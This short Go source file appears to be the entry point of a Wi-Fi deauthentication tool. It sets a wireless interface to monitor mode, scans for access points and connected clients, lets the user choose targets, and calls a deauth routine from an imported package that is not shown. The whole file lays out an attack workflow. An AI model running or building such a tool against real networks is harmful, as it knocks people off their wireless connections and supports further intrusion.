package main

import (
	"deauth/interfaces"
	"fmt"
)

func main() {
	// choose the interface
	iface, err := interfaces.AskInterface()
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	// set the interface to monitor mode
	err = iface.SetMonitorMode()
	if err != nil {
		fmt.Println("err : Cannot set the interface to monitor mode")
		return
	}
	// scan for access points
	APs := iface.GetAPs()
	// ask for the access point to deauth
	ap := interfaces.AskAP(APs)
	// scan for clients connected to the access point
	clients := iface.GetClients(ap)
	// ask for the client to deauth in the access point
	client := interfaces.AskClient(clients)
	// deauth the client
	interfaces.Deauth(iface, ap, client)
	// reset the interface to normal mode
	iface.Reset()
}
